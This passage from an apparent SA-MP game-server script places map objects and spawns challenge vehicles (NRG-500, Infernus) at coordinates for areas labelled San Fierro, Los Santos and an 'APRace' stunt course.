	CreateSObject(1225, 1400.6462402344, 1594.017578125, 10.21825504303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1388.9321289063, 1623.9681396484, 11.39336681366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(13592, 1388.5538330078, 1641.2843017578, 19.58313369751, 0, 0, 98.75, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1385.2158203125, 1659.029296875, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1225, 1382.6195068359, 1658.8864746094, 10.22606754303, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1399.48046875, 1655.8898925781, 11.40117931366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1676, 1376.8315429688, 1657.6885986328, 11.40117931366, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(11435, 1395.3654785156, 1735.03515625, 14.481563568115, 0, 0, 355.99951171875, object_show_distance, 0, world_challenges);
	CreateSObject(7073, 1417.5316162109, 1729.2229003906, 14.087062835693, 324, 0, 86, object_show_distance, 0, world_challenges);
	CreateSObject(1634, 1400.9688720703, 1718.4976806641, 10.86763381958, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateVehicleEx(522,1487.2015,1838.5446,10.3876,178.3397,-1,-1,respawntime,0,world_challenges); // [NRG-500] Challenge
	CreateVehicleEx(522,1481.9539,1838.1544,10.3811,178.4315,-1,-1,respawntime,0,world_challenges); // [NRG-500] Challenge
	CreateVehicleEx(522,1473.5677,1838.2784,10.3839,177.7788,-1,-1,respawntime,0,world_challenges); // [NRG-500] Challenge
	CreateVehicleEx(522,1467.8458,1837.7795,10.3840,180.9416,-1,-1,respawntime,0,world_challenges); // [NRG-500] Challenge
	CreateVehicleEx(522,1477.6370,1838.3106,10.3816,181.9780,-1,-1,respawntime,0,world_challenges); // [NRG-500] Challenge
	CreateVehicleEx(411,1462.4681,1838.4652,10.2019,180.8139,-1,-1,respawntime,0,world_challenges); // [Infernus] Challenge
	CreateVehicleEx(411,1492.6820,1838.5791,10.1744,180.6802,-1,-1,respawntime,0,world_challenges); // [Infernus] Challenge
	// San Fierro
	CreateSObject(3461, -2708.0239257813, 374.23791503906, 9.55446434021, 0, 0, 0);
	CreateSObject(3461, -2708.0578613281, 378.08648681641, 12.55446434021, 0, 0, 0);
	CreateSObject(3461, -2704.490234375, 378.06176757813, 11.55446434021, 0, 0, 0);
	CreateSObject(3461, -2704.3747558594, 374.15368652344, 10.55446434021, 0, 0, 0);
	CreateSObject(3528, -2765.6096191406, 375.39471435547, 15.31796836853, 0, 0, 358);
	CreateSObject(14637, -2764.0966796875, 375.556640625, 16.304740905762, 0, 0, 0);
	// Los Santos
	CreateSObject(14467, 1495.4384765625, -1749.1906738281, 17.179105758667, 0, 0, 180);
	CreateSObject(14467, 1466.3724365234, -1749.1903076172, 17.179105758667, 0, 0, 179.99450683594);
	CreateSObject(6965, 1479.8135986328, -1639.7598876953, 15.960927963257, 0, 0, 0);
	CreateSObject(3528, 1500.2619628906, -1748.7864990234, 22.995622634888, 0, 0, 87.75);
	CreateSObject(3528, 1462.3002929688, -1748.7578125, 22.689805984497, 0, 0, 87.747802734375);
	// APRace
	CreateSObject(19129, 1663.85181, -2412.42627, 12.51091,   0.00000, 0.00000, 0.00000);
	CreateSObject(19129, 1644.14795, -2412.41748, 12.51091,   0.00000, 0.00000, 0.00000);
	CreateSObject(19129, 1624.22095, -2412.45923, 12.51091,   0.00000, 0.00000, 0.00000);
	CreateSObject(19335, 1663.87964, -2403.65796, 12.44050,   0.00000, 0.00000, 0.00000);
	CreateSObject(19335, 1626.72852, -2403.69849, 12.44050,   0.00000, 0.00000, 0.00000);
	CreateSObject(7586, 1645.36218, -2413.76685, 6.19910,   0.00000, 0.00000, 0.00000);
	CreateSObject(19338, 1645.37451, -2413.81201, -16.22570,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1623.29163, -2422.73779, 14.00540,   0.00000, 0.00000, 229.61523);
	CreateSObject(3437, 1668.60327, -2422.90430, 14.00540,   0.00000, 0.00000, 316.28360);
	CreateSObject(19652, 1640.18848, -2457.58911, 24.65966,   0.00000, 0.00000, 0.00000);
	CreateSObject(19652, 1640.18848, -2457.58911, 29.30265,   0.00000, 180.00000, 0.00000);
	CreateSObject(19652, 1640.18848, -2457.58911, 44.62020,   0.00000, 0.00000, 0.00000);
	CreateSObject(19652, 1640.18848, -2457.58911, 49.33660,   0.00000, 180.00000, 0.00000);
	CreateSObject(19652, 1640.18848, -2457.58911, 64.55150,   0.00000, 0.00000, 0.00000);
	CreateSObject(19652, 1640.21667, -2457.59131, 69.38211,   0.00000, 180.00000, 0.00000);
	CreateSObject(19655, 1629.34631, -2457.68823, 79.32980,   0.00000, 0.00000, 0.97461);
	CreateSObject(19649, 1664.68677, -2441.40234, 84.31560,   0.00000, 0.00000, 0.40604);
	CreateSObject(19649, 1764.62549, -2440.68555, 84.31560,   0.00000, 0.00000, 0.40600);
	CreateSObject(19659, 1800.43665, -2456.26416, 84.29790,   0.00000, 0.00000, 181.10040);
	CreateSObject(19664, 1765.31018, -2472.85889, 86.55930,   0.00000, 0.00000, 181.03230);
	CreateSObject(19649, 1714.69861, -2441.04980, 84.31560,   0.00000, 0.00000, 0.40604);
	CreateSObject(19649, 1715.54553, -2473.24219, 84.31560,   0.00000, 0.00000, 180.00000);
	CreateSObject(19656, 1680.04492, -2489.04248, 79.32830,   0.00000, 0.00000, 0.15457);
	CreateSObject(19656, 1701.32336, -2488.90381, 69.36520,   0.00000, 0.00000, 179.88220);
	CreateSObject(19649, 1715.70166, -2473.09595, 89.82420,   0.00000, 180.00000, 180.00000);
	CreateSObject(19656, 1680.11511, -2488.85620, 84.79290,   180.00000, 0.00000, 0.15460);
	CreateSObject(19656, 1701.34485, -2488.88062, 74.87100,   180.00000, 0.00000, 179.88220);
	CreateSObject(19659, 1680.16614, -2457.06592, 64.45970,   0.00000, 0.00000, 0.00000);
	CreateSObject(19659, 1680.07751, -2457.01929, 69.79005,   180.00000, 0.00000, 0.00000);
	CreateSObject(19649, 1715.36169, -2440.92163, 64.47120,   0.00000, 0.00000, 0.40600);
	CreateSObject(19660, 1750.89551, -2424.79468, 64.48010,   0.00000, 0.00000, 180.35420);
	CreateSObject(19649, 1715.37268, -2440.90820, 69.68680,   180.00000, 0.00000, 180.40601);
	CreateSObject(19660, 1750.89551, -2424.79468, 69.75970,   180.00000, 0.00000, 180.35420);
	CreateSObject(19681, 1727.96631, -2406.62646, 64.63900,   0.00000, 0.00000, 0.98460);
	CreateSObject(19682, 1707.00244, -2393.65503, 64.63900,   0.00000, 0.00000, 182.73080);
	CreateSObject(19681, 1728.00220, -2406.76221, 69.80740,   0.00000, 180.00000, 315.94406);
	CreateSObject(19682, 1707.00513, -2393.71143, 69.83177,   180.00000, 0.00000, 317.57358);
	CreateSObject(19651, 1694.69324, -2375.91235, 74.50860,   0.00000, 0.00000, 1.01850);
	CreateSObject(19651, 1694.69324, -2375.91235, 79.92690,   0.00000, 180.00000, 1.01850);
	CreateSObject(19651, 1694.69324, -2375.91235, 94.36270,   0.00000, 0.00000, 1.54982);
	CreateSObject(19651, 1694.69324, -2375.91235, 99.80055,   0.00000, 180.00000, 1.54980);
	CreateSObject(19687, 1682.88989, -2393.23364, 104.31960,   0.00000, 0.00000, 186.18311);
	CreateSObject(19649, 1645.85388, -2396.91553, 104.29770,   0.00000, 0.00000, 185.51057);
	CreateSObject(19683, 1608.69568, -2400.63721, 103.49800,   0.00000, 0.00000, 186.25630);
	CreateSObject(19683, 1586.08228, -2403.14111, 100.55540,   0.00000, 0.00000, 186.25630);
	CreateSObject(19683, 1562.17126, -2405.76782, 97.25130,   0.00000, 0.00000, 186.25630);
	CreateSObject(19682, 1538.91394, -2410.63379, 94.83250,   0.00000, 0.00000, 231.02740);
	CreateSObject(19682, 1523.42529, -2429.30200, 94.69150,   0.00000, 0.00000, 274.59479);
	CreateSObject(19681, 1520.52734, -2453.82910, 94.61650,   0.00000, 0.00000, 94.41617);
	CreateSObject(19681, 1505.96509, -2472.85425, 94.61650,   0.00000, 0.00000, 55.77345);
	CreateSObject(19688, 1482.99011, -2480.39282, 92.24021,   0.00000, 0.00000, 194.08430);
	CreateSObject(19689, 1463.12292, -2485.17505, 78.71530,   0.00000, 0.00000, 193.14400);
	CreateSObject(19656, 1541.82068, -2561.38257, 109.60420,   0.00000, 0.00000, 93.25308);
	CreateSObject(19652, 1454.23962, -2503.60962, 56.46930,   0.00000, 0.00000, 10.78790);
	CreateSObject(19652, 1454.22498, -2503.64673, 61.89606,   0.00000, 180.00000, 10.78790);
	CreateSObject(19688, 1468.31030, -2519.14014, 44.28920,   0.00000, 0.00000, 0.90705);
	CreateSObject(19689, 1488.95178, -2518.79028, 30.52860,   0.00000, 0.00000, 0.90710);
	CreateSObject(19684, 1512.76758, -2518.49585, 30.49270,   0.00000, 0.00000, 180.51230);
	CreateSObject(19651, 1526.16272, -2534.18555, 41.03440,   0.00000, 0.00000, 185.67320);
	CreateSObject(19651, 1526.16272, -2534.18555, 46.42093,   0.00000, 180.00000, 185.67320);
	CreateSObject(19651, 1527.02942, -2534.04199, 61.02580,   0.00000, 0.00000, 190.06219);
	CreateSObject(19651, 1527.04944, -2533.98193, 66.28240,   0.00000, 180.00000, 190.06219);
	CreateSObject(19649, 1548.40698, -2513.50439, 71.04975,   0.00000, 0.00000, 11.35179);
	CreateSObject(19682, 1584.12268, -2504.18799, 71.08280,   0.00000, 0.00000, 54.83031);
	CreateSObject(19682, 1598.29626, -2484.40894, 71.08280,   0.00000, 0.00000, 98.88571);
	CreateSObject(19682, 1595.96252, -2460.65869, 71.08280,   0.00000, 0.00000, 137.03885);
	CreateSObject(19681, 1581.53625, -2440.46045, 71.08280,   0.00000, 0.00000, 316.55859);
	CreateSObject(19682, 1575.95129, -2416.44702, 71.08280,   0.00000, 0.00000, 137.03885);
	CreateSObject(19688, 1560.46033, -2397.89746, 68.59960,   0.00000, 0.00000, 133.98920);
	CreateSObject(19689, 1546.15686, -2383.18066, 54.88790,   0.00000, 0.00000, 134.24300);
	CreateSObject(19656, 1518.94543, -2378.21997, 47.50840,   0.00000, 0.00000, 315.18451);
	CreateSObject(19664, 1532.50623, -2414.84692, 44.73950,   0.00000, 0.00000, 314.01639);
	CreateSObject(19664, 1567.01990, -2450.53564, 44.73950,   0.00000, 0.00000, 314.01639);
	CreateSObject(19652, 1595.73340, -2457.45923, 32.60020,   0.00000, 0.00000, 312.36761);
	CreateSObject(19652, 1595.74988, -2457.43970, 37.60427,   0.00000, 180.00000, 312.36761);
	CreateSObject(19655, 1579.03943, -2486.66504, 27.60830,   0.00000, 0.00000, 131.29221);
	CreateSObject(19655, 1579.03943, -2486.66504, 32.59306,   180.00000, 0.00000, 131.29221);
	CreateSObject(19652, 1547.90137, -2499.33057, 22.65795,   0.00000, 0.00000, 128.97435);
	CreateSObject(3437, 1669.92151, -2425.46606, 12.39571,   0.00000, 0.00000, 294.88153);
	CreateSObject(3437, 1670.56897, -2428.18823, 11.50170,   0.00000, 0.00000, 271.66025);
	CreateSObject(3437, 1670.34656, -2430.98608, 10.88460,   0.00000, 0.00000, 259.27353);
	CreateSObject(3437, 1622.01770, -2425.27222, 12.39570,   0.00000, 0.00000, 250.22865);
	CreateSObject(3437, 1621.07129, -2427.99854, 11.50170,   0.00000, 0.00000, 250.59930);
	CreateSObject(3437, 1620.67676, -2430.83105, 10.88460,   0.00000, 0.00000, 266.33481);
	CreateSObject(19655, 1578.06812, -2623.20972, 19.82157,   0.00000, 0.00000, 92.36464);
	CreateSObject(19651, 1577.62866, -2612.97217, 34.79560,   0.00000, 0.00000, 271.00351);
	CreateSObject(19651, 1577.61755, -2612.95557, 39.88885,   0.00000, 180.00000, 271.00351);
	CreateSObject(19651, 1577.61536, -2613.03125, 54.68310,   0.00000, 0.00000, 271.00351);
	CreateSObject(19651, 1577.61536, -2613.03125, 59.85950,   0.00000, 180.00000, 271.00351);
	CreateSObject(19651, 1577.61536, -2613.03125, 74.69730,   0.00000, 0.00000, 271.00351);
	CreateSObject(19651, 1577.61536, -2613.03125, 79.88609,   0.00000, 180.00000, 271.00351);
	CreateSObject(19651, 1577.61536, -2613.03125, 94.67832,   0.00000, 0.00000, 271.00351);
	CreateSObject(19651, 1577.61536, -2613.03125, 99.85700,   0.00000, 180.00000, 271.00351);
	CreateSObject(19651, 1577.61536, -2613.03125, 114.70106,   0.00000, 0.00000, 271.00351);
	CreateSObject(19651, 1577.61536, -2613.03125, 119.84788,   0.00000, 180.00000, 271.00351);
	CreateSObject(19651, 1577.61536, -2613.03125, 134.67650,   0.00000, 0.00000, 271.00351);
	CreateSObject(19651, 1577.61536, -2613.03125, 139.89059,   0.00000, 180.00000, 271.00351);
	CreateSObject(19651, 1577.61536, -2613.03125, 154.72090,   0.00000, 0.00000, 271.00351);
	CreateSObject(19651, 1577.61536, -2613.03125, 159.85100,   0.00000, 180.00000, 271.00351);
	CreateSObject(19682, 1559.48608, -2601.32397, 164.74139,   0.00000, 0.00000, 133.85800);
	CreateSObject(19683, 1544.37354, -2582.15088, 163.93629,   0.00000, 0.00000, 133.85800);
	CreateSObject(19681, 1529.27893, -2563.73877, 161.53490,   0.00000, 0.00000, 316.54239);
	CreateSObject(19688, 1526.41028, -2539.69678, 159.14160,   0.00000, 0.00000, 90.65620);
	CreateSObject(19689, 1526.23254, -2519.05151, 145.43900,   0.00000, 0.00000, 90.62480);
	CreateSObject(19688, 1525.98560, -2494.94360, 140.62109,   0.00000, 0.00000, 90.65620);
	CreateSObject(19689, 1525.79797, -2474.30811, 126.91440,   0.00000, 0.00000, 90.62480);
	CreateSObject(19659, 1541.03259, -2451.54419, 124.57460,   0.00000, 0.00000, 272.76529);
	CreateSObject(19654, 1573.29932, -2460.19385, 119.52091,   0.00000, 0.00000, 273.93820);
	CreateSObject(19681, 1555.93530, -2473.44897, 114.52170,   0.00000, 0.00000, 94.23870);
	CreateSObject(19682, 1543.21753, -2494.17603, 114.56870,   0.00000, 0.00000, 269.55569);
	CreateSObject(19681, 1539.22009, -2518.09546, 114.52170,   0.00000, 0.00000, 94.23870);
	CreateSObject(19682, 1527.02637, -2539.51221, 114.52170,   0.00000, 0.00000, 273.84323);
	CreateSObject(19656, 1540.73242, -2539.97314, 99.59200,   0.00000, 0.00000, 272.45709);
	CreateSObject(19656, 1444.21191, -2505.63452, 71.40850,   0.00000, 0.00000, 11.83858);
	CreateSObject(19659, 1509.68506, -2562.36670, 94.62130,   0.00000, 0.00000, 91.58150);
	CreateSObject(19646, 1493.41626, -2547.47217, 94.62130,   0.00000, 0.00000, 91.58150);
	CreateSObject(19660, 1477.14111, -2532.32275, 94.62130,   0.00000, 0.00000, 271.32666);
	CreateSObject(19656, 1541.82068, -2561.38257, 115.10332,   180.00000, 0.00000, 93.25310);
	CreateSObject(19656, 1540.73242, -2539.97314, 105.05980,   180.00000, 0.00000, 272.45709);
	CreateSObject(19659, 1509.68506, -2562.36670, 100.00150,   180.00000, 0.00000, 91.58150);
	CreateSObject(19646, 1493.33325, -2547.22388, 100.06520,   180.00000, 0.00000, 271.78159);
	CreateSObject(19660, 1477.07043, -2532.21631, 100.09330,   180.00000, 0.00000, 271.32669);
	CreateSObject(19688, 1461.07202, -2554.83057, 92.23010,   0.00000, 0.00000, 268.04001);
	CreateSObject(19689, 1460.32275, -2575.06689, 78.78630,   0.00000, 0.00000, 268.04001);
	CreateSObject(19651, 1444.01196, -2586.71582, 86.32580,   0.00000, 0.00000, 88.56270);
	CreateSObject(19651, 1444.01196, -2586.71582, 106.31690,   0.00000, 0.00000, 88.56270);
	CreateSObject(19656, 1475.62537, -2598.00562, 111.29490,   0.00000, 0.00000, 88.88940);
	CreateSObject(19651, 1507.57397, -2588.44971, 116.35430,   0.00000, 0.00000, 268.32339);
	CreateSObject(19664, 1492.54907, -2563.02466, 128.55099,   0.00000, 0.00000, 87.91510);
	CreateSObject(19664, 1494.37927, -2513.17139, 128.56599,   0.00000, 0.00000, 87.91510);
	CreateSObject(19661, 1490.88000, -2477.92603, 126.42049,   0.00000, 0.00000, 176.13507);
	CreateSObject(19662, 1470.41406, -2466.31030, 126.42050,   0.00000, 0.00000, 357.01526);
	CreateSObject(19661, 1461.25562, -2444.92139, 126.42049,   0.00000, 0.00000, 176.13507);
	CreateSObject(19653, 1452.51343, -2423.21460, 131.37440,   0.00000, 0.00000, 354.79770);
	CreateSObject(19653, 1452.51343, -2423.21460, 141.35846,   0.00000, 0.00000, 354.79770);
	CreateSObject(19653, 1452.51343, -2423.21460, 151.36189,   0.00000, 0.00000, 354.79770);
	CreateSObject(19653, 1453.03357, -2423.22388, 161.32549,   0.00000, 0.00000, 354.79770);
	CreateSObject(19683, 1439.20190, -2437.89722, 165.50720,   0.00000, 0.00000, 174.55490);
	CreateSObject(19683, 1415.30823, -2435.06274, 162.23660,   0.00000, 0.00000, 171.66969);
	CreateSObject(19685, 1391.12000, -2431.36987, 157.42160,   0.00000, 0.00000, 170.76849);
	CreateSObject(19656, 1365.52722, -2443.06421, 151.65100,   0.00000, 0.00000, 349.53491);
	CreateSObject(19656, 1386.39746, -2446.99365, 141.69650,   0.00000, 0.00000, 169.27071);
	CreateSObject(19656, 1365.45081, -2442.98462, 131.70320,   0.00000, 0.00000, 348.92709);
	CreateSObject(19649, 1397.04590, -2466.05225, 126.73940,   0.00000, 0.00000, 347.45651);
	CreateSObject(19656, 1435.22034, -2458.26929, 121.76100,   0.00000, 0.00000, 167.54330);
	CreateSObject(19652, 1424.75879, -2455.95728, 106.78920,   0.00000, 0.00000, 167.23680);
	CreateSObject(19682, 1415.93152, -2440.13623, 96.78730,   0.00000, 0.00000, 212.36180);
	CreateSObject(19681, 1393.15967, -2449.28442, 96.78730,   0.00000, 0.00000, 34.02509);
	CreateSObject(19682, 1368.38391, -2449.50537, 96.78730,   0.00000, 0.00000, 214.43431);
	CreateSObject(19682, 1348.36145, -2462.60376, 96.78730,   0.00000, 0.00000, 256.89590);
	CreateSObject(19682, 1342.24097, -2486.04248, 96.78730,   0.00000, 0.00000, 298.79245);
	CreateSObject(19664, 1357.76636, -2519.81006, 99.01570,   0.00000, 0.00000, 298.17770);
	CreateSObject(19652, 1547.90137, -2499.33057, 27.59350,   0.00000, 180.00000, 128.97430);
	CreateSObject(19652, 1383.47705, -2534.11060, 86.80250,   0.00000, 0.00000, 298.66891);
	CreateSObject(19652, 1383.47705, -2534.11060, 66.81330,   0.00000, 0.00000, 298.66891);
	CreateSObject(19663, 1381.46326, -2563.57813, 54.56480,   0.00000, 0.00000, 298.66891);
	CreateSObject(19664, 1405.26270, -2607.16699, 59.00530,   0.00000, 0.00000, 298.66891);
	CreateSObject(19688, 1449.26135, -2630.65137, 54.37350,   0.00000, 0.00000, 26.11200);
	CreateSObject(19661, 1426.45337, -2635.96777, 56.78530,   0.00000, 0.00000, 26.13087);
	CreateSObject(19689, 1467.75696, -2621.56958, 40.63684,   0.00000, 0.00000, 26.11200);
	CreateSObject(19652, 1471.57288, -2602.03442, 28.28080,   0.00000, 0.00000, 26.17440);
	CreateSObject(19688, 1489.45947, -2610.89868, 15.86890,   0.00000, 0.00000, 26.55045);
	CreateSObject(18847, 2182.06030, -2546.14722, 49.10020,   0.00000, -14.00000, 0.00000);
	CreateSObject(18847, 2414.47803, -2546.28394, 106.83411,   0.00000, -14.00000, 0.00000);
	CreateSObject(18847, 2504.86133, -2546.96851, 106.83410,   0.00000, -90.00000, 0.00000);
	CreateSObject(18830, 2038.56592, -2567.04834, 17.65060,   0.00000, 207.00000, 359.92749);
	CreateSObject(18830, 2038.52734, -2555.18042, 17.65060,   0.00000, 207.00000, 359.92749);
	CreateSObject(18830, 2038.47620, -2543.42749, 17.65060,   0.00000, 207.00000, 359.92749);
	CreateSObject(18830, 2038.48572, -2531.66821, 17.65060,   0.00000, 207.00000, 359.92749);
	CreateSObject(18830, 2038.37573, -2519.82300, 17.65060,   0.00000, 207.00000, 359.92749);
	CreateSObject(18779, 1948.76343, -2638.99634, 22.47850,   0.00000, 0.00000, 90.00000);
	CreateSObject(18779, 1948.72437, -2648.80737, 32.37250,   0.00000, 28.00000, 90.00000);
	CreateSObject(18779, 1948.72278, -2651.97559, 49.34600,   0.00000, 93.00000, 90.00000);
	CreateSObject(18779, 1935.13501, -2452.26685, 22.47850,   0.00000, 0.00000, 270.00000);
	CreateSObject(18779, 1935.10669, -2441.87915, 32.37250,   0.00000, 28.00000, 270.00000);
	CreateSObject(18779, 1935.09412, -2439.02686, 49.37250,   0.00000, 93.00000, 270.00000);
	CreateSObject(18781, 1815.68347, -2455.22485, 23.25385,   0.00000, 0.00000, 180.00000);
	CreateSObject(18781, 1815.74670, -2532.25366, 23.25390,   0.00000, 0.00000, 0.00000);
	CreateSObject(13667, 1815.35095, -2502.82202, 41.39020,   0.00000, 0.00000, 100.00000);
	CreateSObject(13667, 1815.65967, -2506.09424, 41.39020,   0.00000, 0.00000, 280.00000);
	CreateSObject(13667, 1815.68457, -2490.65454, 41.39020,   0.00000, 0.00000, 100.00000);
	CreateSObject(13667, 1815.80286, -2493.83667, 41.39020,   0.00000, 0.00000, 280.00000);
	CreateSObject(13667, 1815.08203, -2479.51611, 41.39020,   0.00000, 0.00000, 100.00000);
	CreateSObject(13667, 1815.19202, -2482.90527, 41.39020,   0.00000, 0.00000, 280.00000);
	CreateSObject(19005, 1677.63245, -2543.11499, 15.53815,   0.00000, 0.00000, 90.00000);
	CreateSObject(16776, 1653.45654, -2543.34131, 14.57387,   0.00000, 0.00000, 0.00000);
	CreateSObject(19005, 1628.29114, -2543.15967, 15.53810,   0.00000, 0.00000, 270.00000);
	CreateSObject(18777, 1747.80298, -2548.80444, 15.10631,   0.00000, 0.00000, 0.00000);
	CreateSObject(18777, 1747.77686, -2548.79346, 41.11700,   0.00000, 0.00000, 0.00000);
	CreateSObject(18777, 1747.80298, -2548.80444, 67.09730,   0.00000, 0.00000, 0.00000);
	CreateSObject(18777, 1747.80298, -2548.80444, 93.09113,   0.00000, 0.00000, 0.00000);
	CreateSObject(18772, 1767.82715, -2423.89160, 119.09740,   0.00000, 0.00000, 0.00000);
	CreateSObject(18778, 1767.80066, -2295.55103, 117.93044,   0.00000, 0.00000, 0.00000);
	CreateSObject(19634, 1970.53638, -2543.91919, 21.78759,   0.00000, 0.00000, 0.00000);
	CreateSObject(19635, 1970.55762, -2543.94287, 31.91980,   0.00000, 0.00000, 0.00000);
	CreateSObject(19633, 1970.33643, -2542.10327, 44.24121,   0.00000, 0.00000, 0.00000);
	CreateSObject(18750, 1791.40234, -2652.15991, 80.91427,   90.00000, 0.00000, 180.00000);
	CreateSObject(3437, 1898.20862, -2325.69092, 57.74743,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1904.92847, -2325.65112, 53.10010,   0.00000, 90.00000, 0.00000);
	CreateSObject(3437, 1910.65601, -2325.88135, 57.74743,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1915.87268, -2325.82739, 57.74743,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1920.43799, -2325.70581, 58.85031,   0.00000, 130.00000, 0.00000);
	CreateSObject(3437, 1920.46155, -2325.74438, 54.53870,   0.00000, 62.00000, 0.00000);
	CreateSObject(3437, 1929.11230, -2325.72070, 57.74743,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1933.52747, -2325.70581, 58.55970,   0.00000, 135.00000, 0.00000);
	CreateSObject(3437, 1945.05823, -2325.72754, 57.74743,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1940.85791, -2325.72803, 58.55970,   0.00000, -135.00000, 0.00000);
	CreateSObject(18780, 1906.94739, -2362.71338, 14.94610,   0.00000, 0.00000, 90.00000);
	CreateSObject(18780, 1916.86157, -2362.78247, 14.94610,   0.00000, 0.00000, 90.00000);
	CreateSObject(18780, 1926.71313, -2362.83740, 14.94610,   0.00000, 0.00000, 90.00000);
	CreateSObject(18780, 1936.71118, -2362.93579, 14.94610,   0.00000, 0.00000, 90.00000);
	CreateSObject(3437, 1621.39209, -2420.09399, 16.01385,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1621.53784, -2419.55347, 16.01385,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1621.71216, -2419.05029, 16.01385,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1621.85156, -2418.65601, 16.01385,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1621.98865, -2418.26123, 16.01385,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1670.24841, -2419.79492, 16.01385,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1670.14233, -2419.36597, 16.01385,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1669.98425, -2418.84985, 16.01385,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1669.82031, -2418.37817, 16.01385,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1669.68274, -2417.98169, 16.01385,   0.00000, 0.00000, 0.00000);
	CreateSObject(19005, 1907.40698, -2542.90649, 12.32375,   0.00000, 0.00000, 90.00000);
	CreateSObject(19002, 1890.60791, -2543.14014, 24.73028,   0.00000, 0.00000, 90.00000);
	CreateSObject(19002, 1888.56982, -2543.17334, 24.73028,   0.00000, 0.00000, 90.00000);
	CreateSObject(19002, 1886.93042, -2542.99951, 24.73028,   0.00000, 0.00000, 90.00000);
	CreateSObject(19002, 1885.59985, -2543.02075, 24.73028,   0.00000, 0.00000, 90.00000);
	CreateSObject(19002, 1883.87769, -2543.12134, 24.73028,   0.00000, 0.00000, 90.00000);
	CreateSObject(19002, 1882.03357, -2543.08667, 24.73028,   0.00000, 0.00000, 90.00000);
	CreateSObject(19002, 1880.25928, -2543.03394, 24.73028,   0.00000, 0.00000, 90.00000);
	CreateSObject(18847, 1787.37915, -2759.53979, 44.80653,   0.00000, 0.00000, 90.00000);
	CreateSObject(18779, 1788.11328, -2620.01636, 16.13290,   0.00000, 0.00000, 90.00000);
	CreateSObject(18779, 1799.12073, -2619.96362, 16.13290,   0.00000, 0.00000, 90.00000);
	CreateSObject(18779, 1810.20422, -2620.00708, 16.13290,   0.00000, 0.00000, 90.00000);
	CreateSObject(18779, 1777.10120, -2619.96338, 16.13290,   0.00000, 0.00000, 90.00000);
	CreateSObject(18847, 1787.75525, -2759.53003, 106.88830,   0.00000, 180.00000, 270.00000);
	CreateSObject(18847, 1787.66968, -2857.55933, 23.16320,   0.00000, 90.00000, 90.00000);
	CreateSObject(18836, 1816.28857, -2493.96509, 12.11400,   0.00000, 0.00000, 90.00000);
	CreateSObject(18836, 1816.28857, -2493.96509, 12.11400,   0.00000, 0.00000, 90.00000);
	CreateSObject(18836, 1768.25989, -2493.96045, 12.11400,   0.00000, 0.00000, 90.00000);
	CreateSObject(18836, 1864.83228, -2493.98120, 12.11400,   0.00000, 0.00000, 90.00000);
	CreateSObject(18780, 1903.14063, -2493.97119, 22.36280,   0.00000, 0.00000, 360.00000);
	CreateSObject(18801, 1855.50085, -2439.18213, 35.31690,   0.00000, 0.00000, 90.00000);
	CreateSObject(18780, 1864.41223, -2471.99194, 2.10730,   0.00000, 18.00000, 83.00000);
	CreateSObject(18780, 1858.80640, -2471.33203, 2.10730,   0.00000, 18.00000, 83.00000);
	CreateSObject(18982, 2006.10522, -2655.17578, 37.29995,   -24.00000, 0.00000, 0.69447);
	CreateSObject(18982, 2007.21021, -2746.35522, 77.90450,   -24.00000, 0.00000, 0.69450);
	CreateSObject(18983, 2008.31458, -2837.43750, 118.46820,   -24.00000, 0.00000, 0.69450);
	CreateSObject(18983, 2009.43469, -2928.70361, 159.09270,   -24.00000, 0.00000, 0.69450);
	CreateSObject(8040, 2008.97449, -3016.27271, 175.72141,   0.00000, 0.00000, 90.00000);
	CreateSObject(3472, 2008.77954, -2998.05103, 174.90242,   0.00000, 0.00000, 0.00000);
	CreateSObject(3472, 2008.84509, -3006.64404, 174.90242,   0.00000, 0.00000, 0.00000);
	CreateSObject(3472, 2008.93262, -3015.03735, 174.90242,   0.00000, 0.00000, 0.00000);
	CreateSObject(3472, 2008.96643, -3023.27783, 174.90242,   0.00000, 0.00000, 0.00000);
	CreateSObject(3472, 2008.95801, -3031.85400, 174.90242,   0.00000, 0.00000, 0.00000);
	CreateSObject(3660, 2008.56299, -3027.53589, 176.54907,   0.00000, 0.00000, 90.00000);
	CreateSObject(3660, 2008.56396, -3007.90430, 176.54907,   0.00000, 0.00000, 90.00000);
	CreateSObject(3660, 2008.54480, -3004.54468, 176.54907,   0.00000, 0.00000, 90.00000);
	CreateSObject(8210, 2027.41223, -3027.94800, 179.24510,   0.00000, 0.00000, 270.00000);
	CreateSObject(8210, 2027.45520, -3004.05176, 179.24510,   0.00000, 0.00000, 270.00000);
	CreateSObject(987, 1993.11218, -2976.25732, 175.02190,   0.00000, 0.00000, 0.00000);
	CreateSObject(987, 2015.04395, -2976.67407, 174.93690,   0.00000, 0.00000, 0.00000);
	CreateSObject(3511, 2014.53015, -2976.30322, 174.63672,   0.00000, 0.00000, 0.00000);
	CreateSObject(3511, 2004.92651, -2976.12671, 174.63672,   0.00000, 0.00000, 0.00000);
	CreateSObject(3437, 1995.83972, -3052.18896, 179.07257,   0.00000, 0.00000, 305.13391);
	CreateSObject(3437, 1994.52112, -3049.69141, 176.81569,   0.00000, 0.00000, 287.83279);
	CreateSObject(3437, 1993.78345, -3046.90063, 174.72861,   0.00000, 0.00000, 278.63998);
	CreateSObject(3437, 1993.53052, -3044.16870, 172.19385,   0.00000, 0.00000, 261.59177);
